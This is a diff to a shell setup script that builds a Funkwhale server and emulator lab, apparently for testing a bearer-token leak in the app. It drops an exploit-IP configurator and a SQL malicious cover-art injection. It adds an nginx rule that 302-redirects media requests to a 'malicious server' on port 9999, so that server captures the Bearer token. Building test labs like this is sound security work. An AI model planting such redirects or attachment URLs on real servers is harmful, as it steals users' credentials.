@@ -22,8 +22,7 @@ setup_server(){
     sed "s|__SERVER_DIR__|$server_dir|g" .env.template > .env
     chmod 600 .env
 
-    # Disable media proxy so cover art URLs redirect to external URLs
-    # instead of being proxied server-side (needed for token leakage vulnerability)
+    # Disable media proxy so cover art URLs are served directly
     echo "PROXY_MEDIA=false" >> .env
 
     SNAPSHOT_FILE="$server_dir/postgres-snapshot1017.tar.gz"
@@ -58,34 +57,11 @@ setup_server(){
     log_info "Web interface at https://localhost (HTTPS)"
 }
 
-configure_exploit_host_ip() {
-    log_info "Configuring exploit scripts with host IP"
-
-    local host_ip
-    host_ip=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | head -1)
-
-    if [[ -z "$host_ip" ]]; then
-        log_warn "Could not detect host IP, exploit may not work"
-        return
-    fi
-
-    log_info "Detected host IP: $host_ip"
-
-    local exploit_script="${SCRIPT_DIR}/synthetic_vulnerabilities/vuln_1/exploit_files/exploit.sh"
-    if [[ -f "$exploit_script" ]]; then
-        sed -i.bak "s/HOST_IP_PLACEHOLDER/$host_ip/g" "$exploit_script"
-        rm -f "${exploit_script}.bak"
-        log_info "Updated exploit script with host IP: $host_ip"
-    else
-        log_warn "Exploit script not found at $exploit_script"
-    fi
-}
-
 authenticate_app() {
     log_info "Pre-authenticating Funkwhale app on emulator..."
 
     local server_dir="$SCRIPT_DIR/funkwhale-server"
-    local emulator_hostname="http://10.0.2.2"
+    local emulator_hostname="https://10.0.2.2"
     local prefs_file="/tmp/funkwhale_credentials.xml"
 
     # Generate unique client and token values
@@ -222,54 +198,86 @@ PYEOF
         adb shell "chown ${app_uid}:${app_uid} ${prefs_dir}/credentials.xml"
     fi
 
+    # Fix SELinux context so the app can read the file
+    local secontext
+    secontext=$(adb shell ls -Z "/data/data/${TARGET_PACKAGE}/" | head -1 | awk '{print $1}') || true
+    if [[ -n "$secontext" && "$secontext" != "?" ]]; then
+        adb shell "chcon '$secontext' '${prefs_dir}/credentials.xml'" 2>/dev/null || true
+        adb shell "chcon '$secontext' '${prefs_dir}/'" 2>/dev/null || true
+        log_info "Applied SELinux context: $secontext"
+    fi
+
     rm -f "$prefs_file"
 
     log_info "App pre-authenticated as user 'agent' at ${emulator_hostname}"
 }
 
-inject_malicious_cover_art() {
-    log_info "Injecting malicious cover art URL into database..."
-
-    local host_ip
-    host_ip=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | head -1)
-
-    if [[ -z "$host_ip" ]]; then
-        log_warn "Could not detect host IP, skipping cover art injection"
-        return
-    fi
-
-    local malicious_url="http://${host_ip}:8082/malicious.png"
+create_cover_art_placeholder() {
+    # The snapshot has cover art attachments with file='attachments/covers/cover.png'.
+    # The media volume is ephemeral, so we need to create the actual PNG file each run.
+    log_info "Creating placeholder cover art image in media volume..."
 
     local server_dir="$SCRIPT_DIR/funkwhale-server"
     cd "$server_dir"
 
-    # Create a malicious attachment and link it to the first album
-    local inject_sql="
-    DO \$\$
-    DECLARE
-        new_attachment_id INTEGER;
-        target_album_id INTEGER;
-    BEGIN
-        SELECT id INTO target_album_id FROM music_album ORDER BY id LIMIT 1;
-        IF target_album_id IS NULL THEN
-            RAISE NOTICE 'No albums found, skipping cover art injection';
-            RETURN;
-        END IF;
+    docker compose exec -T api python3 -c "
+import base64, pathlib
+png = base64.b64decode(
+    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4'
+    'nGP4z8BQDwAEgAF/pooBPQAAAABJRU5ErkJggg=='
+)
+cover_dir = pathlib.Path('/srv/funkwhale/data/media/attachments/covers')
+cover_dir.mkdir(parents=True, exist_ok=True)
+cover_path = cover_dir / 'cover.png'
+cover_path.write_bytes(png)
+print(f'Created placeholder: {cover_path} ({len(png)} bytes)')
+" || log_warn "Failed to create placeholder cover art"
+}
 
-        INSERT INTO common_attachment (uuid, url, mimetype, creation_date, size, file)
-        VALUES (gen_random_uuid(), '${malicious_url}', 'image/png', NOW(), 0, '')
-        RETURNING id INTO new_attachment_id;
+inject_nginx_redirect() {
+    log_info "Injecting nginx redirect for media attachments..."
 
-        UPDATE music_album SET attachment_cover_id = new_attachment_id WHERE id = target_album_id;
+    # Inject nginx redirect rule so that any request to /media/attachments/*
+    # gets 302-redirected to our malicious server on port 9999.
+    # The app fetches cover art -> nginx redirects -> malicious server captures Bearer token.
+    local redirect_url="http://10.0.2.2:9999/malicious.png"
 
-        RAISE NOTICE 'Injected malicious cover art (attachment=%, album=%)', new_attachment_id, target_album_id;
-    END \$\$;
-    "
+    docker exec front sh -c "
+        # Find the active nginx config
+        CONF=''
+        for f in /etc/nginx/conf.d/default.conf /etc/nginx/conf.d/funkwhale.conf; do
+            if [ -f \"\$f\" ]; then CONF=\"\$f\"; break; fi
+        done
+        if [ -z \"\$CONF\" ]; then
+            echo 'ERROR: No nginx config found'
+            exit 1
+        fi
+        echo \"Using nginx config: \$CONF\"
 
-    docker compose exec -T postgres psql -U funkwhale -d funkwhale -c "$inject_sql" || \
-        log_warn "Failed to inject malicious cover art"
+        if grep -q 'media/attachments' \"\$CONF\" 2>/dev/null; then
+            echo 'Nginx redirect already present'
+        else
+            # Insert redirect block before the existing /media/ location
+            sed -i '/location \/media\//i \\
+    location /media/attachments/ {\\
+        return 302 ${redirect_url};\\
+    }' \"\$CONF\"
+            nginx -s reload
+            echo 'Nginx redirect injected and reloaded'
+        fi
 
-    log_info "Malicious cover art injection completed"
+        # Verify the redirect is in place
+        echo '--- Nginx config snippet ---'
+        grep -A2 'media/attachments' \"\$CONF\" || echo 'WARNING: redirect not found in config'
+        echo '--- End snippet ---'
+    " || log_warn "Failed to inject nginx redirect"
+
+    # Verify redirect works from the host
+    local redirect_check
+    redirect_check=$(curl -sk -o /dev/null -w "%{http_code}" "https://localhost/media/attachments/test.png" 2>/dev/null) || true
+    log_info "Nginx redirect test: GET /media/attachments/test.png -> HTTP $redirect_check (expect 302)"
+
+    log_info "Nginx redirect injection completed"
 }
 
 main(){
@@ -279,8 +287,11 @@ main(){
     adb_install_apk "$APK_PATH"
     authenticate_app
 
-    configure_exploit_host_ip
-    inject_malicious_cover_art
+    # The snapshot already contains playable albums with cover art attachments.
+    # We just need to create the placeholder PNG (media volume is ephemeral)
+    # and inject the nginx redirect to route cover art requests to our malicious server.
+    create_cover_art_placeholder
+    inject_nginx_redirect
 
     log_info "Funkwhale server + app setup completed successfully!"
 }
